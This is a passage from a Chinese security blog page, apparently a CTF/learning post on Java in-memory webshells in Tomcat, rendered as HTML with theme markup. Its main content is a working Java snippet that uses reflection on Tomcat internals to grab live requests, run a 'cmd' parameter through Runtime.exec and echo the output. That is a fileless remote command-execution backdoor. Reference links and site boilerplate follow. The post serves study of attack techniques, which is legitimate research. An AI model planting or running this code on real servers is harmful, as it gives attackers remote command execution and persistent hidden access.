System.out.println(standardContext);<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取ApplicationContext</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);<br> <br>            <span class="hljs-comment">//获取StandardService</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">standardServiceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) standardServiceField.get(applicationContext);<br> <br>            <span class="hljs-comment">//获取Connector</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">connectorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> connectors[<span class="hljs-number">0</span>];<br> <br>            <span class="hljs-comment">//获取Handler</span><br>            <span class="hljs-type">ProtocolHandler</span> <span class="hljs-variable">protocolHandler</span> <span class="hljs-operator">=</span> connector.getProtocolHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.tomcat.util.net.AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);<br> <br>            <span class="hljs-comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">globalHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalHandler.get(handler);<br> <br>            <span class="hljs-comment">//获取processors</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br> <br>            <span class="hljs-comment">//获取request和response</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br> <br>                <span class="hljs-comment">//获取org.apache.coyote.Request</span><br>                org.apache.coyote.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);<br> <br>                <span class="hljs-comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">http_request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">http_response</span> <span class="hljs-operator">=</span> http_request.getResponse();<br> <br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> http_response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> http_request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br> <br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png" srcset="/img/loading.gif" lazyload alt="image-20230201092245861"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog (goodapple.top)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">Tomcat中一种半通用回显方法 - Kingkk’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+        <a href="/tags/java/">#java</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JavaWeb内存马学习</div>
+      <div>http://sloth31.github.io/2023/01/20/Java安全之内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sloth</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月20日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Hessian反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hessian反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/" title="Tabby安装配置及使用">
+                        <span class="hidden-mobile">Tabby安装配置及使用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
